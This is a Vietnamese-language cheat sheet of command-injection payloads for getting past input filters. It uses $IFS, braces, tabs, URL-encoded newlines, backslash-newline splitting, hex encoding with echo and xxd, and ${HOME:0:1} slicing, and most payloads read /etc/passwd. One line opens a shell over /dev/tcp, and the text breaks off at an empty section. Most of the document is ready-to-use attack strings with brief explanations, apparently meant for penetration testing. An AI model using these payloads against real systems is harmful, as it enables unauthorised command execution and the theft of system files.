# Blackbox testing 

## Bypass space

Linux only

dùng `<`

- `cat</etc/passwd`

dùng {,}

- `{cat,/etc/passwd}`

dùng $IFS 

- `cat$IFS/etc/passwd`

dùng ${IFS} kết hợp với các toán tử logic

- `echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd`

sử dụng gán toán tử kết hợp với mã hóa kí tự space thành `\x20` trong hex

- `X=$(uname\x20-a)&&$x` hoặc `X=$'uname\x20-a'&&$X`

thiết lập 1 kết nối shell đến một cổng mở bất kì

- `sh</dev/tcp/127.0.0.1/4242`

> ${IFS} là biến môi trường được sử dụng để xác định ký tự phân tách được sử dụng để tách các phần của một lệnh hoặc đối số. Giá trị mặc định của biến này là một khoảng trắng, tab hoặc ký tự xuống dòng. Tuy nhiên nó có thể được đặt thành bất kỳ ký tự nào khác.

thực hiện command bằng bash script mà không cần đến `space,$,{}`

- IFS=,;\`cat<<<uname,-a\`

có thể sử dụng tab thay thế space trong một số trường hợp

- `cat%09/etc/passwd`

Windows only

```
ping%CommonProgramFiles:~10,-18%IP
ping%PROGRAMFILES:~10,-5%IP
```

## Bypass with a line return

- `something%0Acat%20/etc/passwd`

- `cat > /tmp/hi << EOF%0ahello%0aEOF`

> Ở đây cú pháp `<<EOF` là một dạng `here document` trong shell scripting, cho phép người dùng nhập nội dung trực tiếp từ dòng lệnh. Phần kết thúc của chuỗi này chính là kí tự `EOF`.

## Bypass with backslash newline

```
cat /et\
c/pas\
swd
```

URL encoded sẽ là: `cat%20/et%5C%0Ac/pa%5C%0Asswd`

## Bypass characters filter via hex encoding

 Ta có thể sử dụng lệnh echo -e để trong cú pháp truyền vào có thể sử dụng các loại mã hóa như `\n` là xuống dòng, `\t` là tab.

```shell
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" (/etc/passwd)

cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`

abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc

`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`

```

Ta cũng có thế sử dụng hexdump kết hợp xxd:

```shell
#Cach 1
    xxd -r -p <<< 2f6574632f706173737764 (/etc/passwd)
    cat `xxd -r -p <<< 2f6574632f706173737764` 
#Cach 2
    xxd -r -ps <(echo 2f6574632f706173737764) (/etc/passwd)
    cat `xxd -r -ps <(echo 2f6574632f706173737764)`

# -r la reverse tu kieu hex ve dang ASCII 
# -p la input dua vao duoi dang hexdump khong co bat ky ki tu xuong dong hay ki tu ACSII
# <() o day thay the cho viec su dung output cua command nhu mot tap tin
# -ps chuyen input thanh hexa khong co them mot dinh dang bo sung nao
```

## Bypass character filter

Nếu ta bị filter mất dấu `/` thì ta có thể sử dụng một số cách sau: 

```shell
# Cach 1
    echo ${HOME:0:1}
    cat `echo ${HOME:0:1}etc${HOME:0:1}passwd` (/etc/passwd)

# Explain: Command ${HOME:0:1} sử dụng lệnh mở rộng của bash shell. 
#   - HOME chính là biến môi trường của Linux
#   - 0 đánh dấu điểm bắt đầu lấy của string mới
#   - 1 là số kí tự lấy bắt đầu từ điểm đã đánh dấu
# Ở đây biến HOME thường chứa đường dẫn home tạo sẵn của người dùng. Thông thường sẽ là /home/user. Vậy nếu command trên được thực thi thì nó sẽ lấy được kí tự / xuất hiện đầu tiên trong đường dẫn.

# Cach 2
    
```



